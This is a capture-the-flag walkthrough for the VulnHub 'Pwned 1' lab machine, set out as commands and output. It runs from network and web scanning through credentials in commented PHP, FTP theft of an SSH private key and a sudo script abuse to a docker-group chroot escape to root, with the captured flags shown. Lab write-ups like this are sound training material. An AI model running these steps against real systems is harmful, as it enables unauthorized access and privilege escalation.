
# PWNED 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/pwned-1,507/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.100   08:00:27:48:58:74      1      60  PCS Systemtechnik GmbH                                           
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.100
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 13:14 -03
Nmap scan report for pwned (192.168.1.100)
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.49 seconds
```

### Web Analysis

```
$ dirb http://192.168.1.100

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan 17 13:17:23 2021
URL_BASE: http://192.168.1.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.100/ ----
+ http://192.168.1.100/index.html (CODE:200|SIZE:3065)                                                               
+ http://192.168.1.100/robots.txt (CODE:200|SIZE:41)                                                                 
+ http://192.168.1.100/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
-----------------
END_TIME: Sun Jan 17 13:17:25 2021
DOWNLOADED: 4612 - FOUND: 3
```

```
$ nikto -h http://192.168.1.100

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.100
+ Target Hostname:    192.168.1.100
+ Target Port:        80
+ Start Time:         2021-01-17 13:17:11 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /nothing/: Directory indexing found.
+ Entry '/nothing/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: bf9, size: 5a9c7ca4a3440, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-01-17 13:17:27 (GMT-3) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.100
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,js,/,html,php
[+] Timeout:        10s
===============================================================
2021/01/17 13:37:28 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/nothing (Status: 301)
/server-status (Status: 403)
/hidden_text (Status: 301)
===============================================================
2021/01/17 13:42:15 Finished
===============================================================
```

### Hidden Directory Analysis

```
$ wget http://192.168.1.100/hidden_text/secret.dic

--2021-01-17 13:47:09--  http://192.168.1.100/hidden_text/secret.dic
Connecting to 192.168.1.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 211
Saving to: ‘secret.dic’

secret.dic                    100%[==============================================>]     211  --.-KB/s    in 0s      

2021-01-17 13:47:09 (33.2 MB/s) - ‘secret.dic’ saved [211/211]
```

```
$ cat secret.dic

/hacked
/vanakam_nanba
/hackerman.gif 
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg 
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home 
```

```
$ gobuster dir -t 50 -u http://192.168.1.100 -w ~/Desktop/secret.dic

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.100
[+] Threads:        50
[+] Wordlist:       /home/burton/Desktop/secret.dic
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/17 13:47:16 Starting gobuster
===============================================================
/pwned.vuln (Status: 301)
===============================================================
2021/01/17 13:47:16 Finished
===============================================================
```

### /pwned.vul Analysis

Page Source:
```
.
..
...

<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```

Credentials:
* User: **ftpuser**
* Pass: **B0ss_B!TcH**

### FTP Access

```
$ ftp 192.168.1.100

Connected to 192.168.1.100.
220 (vsFTPd 3.0.3)

Name (192.168.1.100:burton): ftpuser
Password: B0ss_B!TcH

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp>
```

```
ftp> pwd
257 "/home/ftpuser/share" is the current directory

ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt

ftp> mget .

mget id_rsa? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
226 Transfer complete.
2602 bytes received in 0.00 secs (31.4109 MB/s)

mget note.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (75 bytes).
226 Transfer complete.
75 bytes received in 0.00 secs (1.0518 MB/s)
```

### SSH Access

```
$ cat note.txt 

Wow you are here 
ariana won't happy about this note 
sorry ariana :(
```

```
$ ssh -i id_rsa ariana@192.168.1.100

Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70

ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

### Flag #1 - Ariana

```
ariana@pwned:~$ cat user1.txt

congratulations you Pwned ariana 
Here is your user flag ↓↓↓↓↓↓↓
fb8d98be1265dd88bac522e1b2182140
Try harder.need become root
```

### Privilege Escalation to Selena

Ariana's user is allowed to run `/home/messenger.sh` as Selena's user.
```
ariana@pwned:~$ sudo -l

Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

Spawning a bash with `/home/messenger.sh` as Selena's user.
```
ariana@pwned:~$ sudo -u selena /home/messenger.sh 

Welcome to linux.messenger 

ariana:
selena:
ftpuser:

Enter username to send message : selena
Enter message for selena : bash

Sending message to selena

id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)

python3 -c 'import pty;pty.spawn("/bin/bash")'
selena@pwned:~$
```

### Flag #2 - Selena

```
selena@pwned:~$ cat /home/selena/user2.txt

711fdfc6caad532815a440f7f295c176
You are near to me. you found selena too.
Try harder to catch me
```

### Privilege Escalation - Root

Selena's user has permission to run `docker`.
```
selena@pwned:~$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

Listing existing docker images.
```
selena@pwned:~$ docker images

REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        6 months ago        88.3MB
<none>              <none>              e13ad046d435        6 months ago        88.3MB
alpine              latest              a24bb4013296        7 months ago        5.57MB
debian              wheezy              10fcec6d95c4        22 months ago       88.3MB
```

Studing what is this `privesc` image I found it is a image that abuses of docker configuration and privileges. \
References:
* https://github.com/flast101/docker-privesc/blob/master/docs/index.md
* https://flast101.github.io/docker-privesc/
* https://gtfobins.github.io/gtfobins/docker/

```
selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

### Flag #3 - Root

```
root@92859c179671:~# cat /root/root.txt

4d4098d64e163d2726959455d046fd7c

You found me. i dont't expect this （◎ . ◎）
I am Ajay (Annlynn) i hacked your server left and this for you.
I trapped Ariana and Selena to takeover your server :)

You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 
Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g
Instgarm   ajs_walker 
Twitter    Ajs_walker
```
